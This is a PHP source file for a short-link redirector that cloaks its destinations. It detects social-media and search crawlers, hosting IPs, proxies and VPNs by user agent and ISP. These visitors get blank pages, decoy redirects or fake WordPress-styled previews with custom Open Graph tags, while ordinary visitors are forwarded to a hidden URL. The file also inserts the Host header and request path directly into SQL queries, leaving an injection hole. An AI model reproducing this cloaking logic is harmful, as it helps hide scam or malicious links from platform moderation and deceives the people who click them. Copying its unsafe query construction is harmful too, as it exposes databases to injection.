<?php

date_default_timezone_set('UTC');

define('GX_PATH', realpath(__DIR__.'/')."/../ptg.pw/");
define('GX_LIB', GX_PATH.'/lib/');

include(GX_PATH.'config.php');
require GX_PATH.'autoload.php';
// Session::start();

include(GX_PATH.'countrycodes.php');


new Db();

// print_r($_SERVER);



$ua = $_SERVER['HTTP_USER_AGENT'];
$host = $_SERVER['HTTP_HOST'];
$ip = Gen::getIP();
$ref = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER']: ""; 
$refurl = parse_url($ref, PHP_URL_HOST);
$ipinfo = Gen::ipInfo($ip);
$info = json_decode($ipinfo, true);



$refAllowed = array(
    't.co',
    'l.facebook.com',
    'm.facebook.com',
    'lm.facebook.com',
    'www.facebook.com',
    'web.facebook.com',
    'l.instagram.com',
    'www.pinterest.com',
    'away.vk.com',
    'wow.in.th',
    'clck.ru',
    'bom.to',
    'v.ht',
    $host
);


if (isset($_SERVER['REQUEST_URI']) ) {
	$req = explode('?', $_SERVER['REQUEST_URI']);
	$path = str_replace('/', '', $req[0]);
} else {
	$path = str_replace('/', '', $_SERVER['SCRIPT_URL']);
}

$linkurl = $_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['HTTP_HOST'].'/'.$path;
$hashed = sha1(md5($linkurl));




$cachefile = "caches/".$hashed;
if( file_exists($cachefile)) {
    $fh = fopen($cachefile, "r");
    $json = fread($fh, filesize($cachefile) );
    fclose($fh);
    $q = json_decode($json);
    $n = 1;
} else {

    $sql = "SELECT * FROM `gen_link` 
        WHERE `full_domain` = '{$host}' 
        AND `hash` = '{$path}'  ";
    $q = Db::result($sql);
    $n = Db::$num_rows;
    echo $n;
    if( $n > 0 ) {
        $json = json_encode($q);
        $fh = fopen($cachefile, "w");
        fwrite($fh, $json );
        fclose($fh);
    } else {
        $sql = "SELECT * FROM `gen_link` 
        WHERE `full_domain` = '{$host}' 
        AND `hash` = '{$path}'  ";
        $q = Db::result($sql);
        $n = Db::$num_rows;
    }

    Db::$mysqli->close();

}



if( $n > 0 ) {
    $usergroup = User::group($q[0]->username);
    
    if( 
        
        strpos($ua, "facebookexternalhit/") !== false ||          
        strpos($ua, "Facebot") !== false ||
        strpos($ua, "Twitterbot") !== false ||
        strpos($ua, "Googlebot") !== false ||
        strpos($ua, "APIs-Google") !== false ||
        strpos($ua, "Mediapartners-Google") !== false ||
        strpos($ua, "AdsBot-Google-Mobile") !== false ||
        strpos($ua, "AdsBot-Google") !== false ||
        strpos($ua, "Googlebot-Image") !== false ||
        strpos($ua, "Googlebot-News") !== false ||
        strpos($ua, "Googlebot-Video") !== false ||
        strpos($ua, "AdsBot-Google-Mobile-Apps") !== false ||
        strpos($ua, "FeedFetcher-Google") !== false ||
        strpos($ua, "Google-Read-Aloud") !== false ||
        strpos($ua, "DuplexWeb-Google") !== false ||
        strpos($ua, "Google Favicon") !== false ||
        strpos($ua, "googleweblight") !== false ||
        strpos($ua, "vkShare") !== false ||
        strpos($ua, "CheckMarkNetwork") !== false ||
        isset($info['isp']) && $info['isp'] == 'Facebook, Inc.' || 
        isset($info['isp']) && $info['isp'] == 'Google LLC' || 
        isset($info['isp']) && $info['isp'] == 'Apple Inc.' || 
        isset($info['isp']) && strpos($info['isp'],'Telegram') !== false || 
        isset($info['status']) && $info['status'] == "fail" ||
        isset($info['hosting']) && $info['hosting'] == 1 || $info['hosting'] == true ||
        isset($info['proxy']) && $info['proxy'] == 1 || $info['proxy'] == true ||
        isset($info['bogon']) && $info['bogon'] == true
    ) {
        Stats::hitStat($linkurl, $q[0]->forward_url, $q[0]->username, $ip, $info['countryCode'], $info['isp'], 'ROBOT/VPN/PROXY');

        if($q[0]->type == 'basic') {
            echo "";
            exit;
        } elseif($q[0]->type == 'fakeurl') {
            // echo "|||".$q[0]->fake_url;
            header('Location: '.$q[0]->fake_url);
            exit;
        } elseif($q[0]->type == 'content') {
            
            $custom_image = strpos($q[0]->custom_image, "://") !== false ? $q[0]->custom_image: 'https://cdn.kull.eu.org'.$q[0]->custom_image;
            $fbapp = ($q[0]->app_id != "") ? "<meta property='fb:app_id' content='".$q[0]->app_id."'>": ""; 
            echo '<!doctype html>
            <html lang="en">
                <head>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
                <meta name="description" content="'.$q[0]->custom_description.'">
                <meta name="keywords" content="'.$q[0]->custom_keywords.'">
                <meta name="generator" content="WordPress 5.3.2">
                <title>'.$q[0]->custom_title.'</title>
            
                <link rel="canonical" href="'.$linkurl.'">
                <meta name="theme-color" content="#563d7c">
                '.$fbapp.'
                <meta property="og:url"                content="'.$linkurl.'" />
                <meta property="og:type"               content="article" />
                <meta property="og:title"              content="'.$q[0]->custom_title.'" />
                <meta property="og:description"        content="'.$q[0]->custom_description.'" />
                <meta property="og:image"              content="'.$custom_image.'" />
                <meta property="og:image:type" content="image/jpeg" />
                <meta property="og:image:width" content="650" />
                <meta property="og:image:height" content="366" />
                <meta name="twitter:card" content="summary_large_image" />
                <meta name="twitter:description" content="'.$q[0]->custom_description.'" />
                <meta name="twitter:image" content="'.$custom_image.'" />
                </head>
                <body>
                <h1>'.$q[0]->custom_title.'</h1>
                <p><img src="'.$custom_image.'" class="img-responsive"></p>
                <p>'.$q[0]->custom_description.'</p>
                <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
        
        </body>
    </html>';
        exit;
        } else {
            header('HTTP/1.1 500 Internal Server Error');
            exit;
        }

    } elseif(
        //!isset($_SERVER['HTTP_REFERER']) &&
        isset($_GET['_branch_match_id'])
        || ( isset($_GET['x']) && $_GET['x'] == "unto" )
        || ( isset($_GET['h']) && $_GET['h'] == $hashed )
    ) {
        // echo "asd";
        if(isset($info['isp']) && $info['isp'] == 'Facebook, Inc.' || $info['status'] == "fail") {
            Stats::hitStat($linkurl, $q[0]->forward_url, $q[0]->username, $ip, $info['countryCode'], $info['isp'], 'IP Fail/FB');
            // echo "def";
            exit;
        } else {
            // echo "fgh";
            Stats::hitStat($linkurl, $q[0]->forward_url, $q[0]->username, $ip, $info['countryCode'], $info['isp'], 'REDIRECT');
            // print_r($q);
            Gen::redirector($q, $ip, $info);
        }
    } else {
        
        
        Stats::hitStat($linkurl, $q[0]->forward_url, $q[0]->username, $ip, $info['countryCode'], $info['isp'], 'REDIRECT');
        Gen::redirector($q, $ip, $info);
        
        exit;
    }
    
} else {
    
    header('HTTP/1.1 404 Page Not Found');
    // header('HTTP/1.1 404 Page Not Found');
    exit;
}


/// NEW END HERE












